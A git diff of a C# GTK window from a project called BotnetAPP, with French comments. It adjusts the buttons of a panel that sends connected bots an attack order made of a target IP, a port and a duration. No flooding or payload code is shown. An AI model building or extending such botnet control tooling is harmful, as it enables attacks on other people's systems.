@@ -8,20 +8,20 @@ using BotnetAPP.Network;
 using BotnetAPP.Data ; 
 
 using BotnetAPP.Shared;
+using System.Timers;
 
 namespace BotnetAPP.UI
 {
     public class MainWindow : Window
     {
-
-
-
         private Boolean IsLockedTarget = false;
 
         private Notebook notebook;
         private VBox _mainBox;
 
-        private Network.Connection _Net ; 
+        private Network.Connection _Net ;
+
+
 
 
         enum Column
@@ -54,8 +54,9 @@ namespace BotnetAPP.UI
             Resizable = false;
 
 
-            _Net = new Network.Connection() ; 
+            _Net = new Network.Connection() ;
 
+ 
 
             /**
             * PAGE PERMETTANT D'AFFICHER LES INFORMATIONS GÉNÉRALE DE L'ETAT ACTUEL
@@ -85,8 +86,6 @@ namespace BotnetAPP.UI
                 Sensitive = false
             };
 
-
-
    
 
             treeView = new TreeView();
@@ -101,7 +100,10 @@ namespace BotnetAPP.UI
 
             treeView.Model = ListStore;
 
-            // Event subscribe 
+            /*
+            Dans le cas ou il y'a une nouvelle connexion ou une deconnexion 
+            on doit refresh complétement le menu
+            */
             _Net.NewConnectedBot += RefreshBoard ;
             _Net.NewDisconnectionBot += RefreshBoard ; 
 
@@ -208,6 +210,21 @@ namespace BotnetAPP.UI
                 }
             };
 
+            _Net.EndAttack += delegate {
+                 AttackButton.Sensitive = true ;
+                VerrouillerCibleBouton.Sensitive = true ;
+            } ; 
+            
+
+            /*
+            delegate {
+                Console.WriteLine("On passe ici") ; 
+
+                AttackButton.Sensitive = true ;
+                VerrouillerCibleBouton.Sensitive = true ;
+            };
+            */
+
 
 
             /**
@@ -234,12 +251,27 @@ namespace BotnetAPP.UI
             Add(_mainBox);
 
             AttackButton.Clicked += delegate {
-                _Net.GiveOrder(new Order(PortAttackSetting.ValueAsInt , TargetIPEntry.Text, DurationAttackSetting.ValueAsInt  )) ; 
+
+                /*
+                Lorsqu'une attaque vient d'être lancée 
+                on désactive tout les boutons
+                */
+
+                AttackButton.Sensitive = false ;
+                VerrouillerCibleBouton.Sensitive = false ;
+
+
+                _Net.GiveOrder(new Order(PortAttackSetting.ValueAsInt , TargetIPEntry.Text, DurationAttackSetting.ValueAsInt  )) ;
+
+            
             } ;
 
 
             ShowAll();
         }
+
+
+
 
 
         private void RefreshBoard(object sender) {
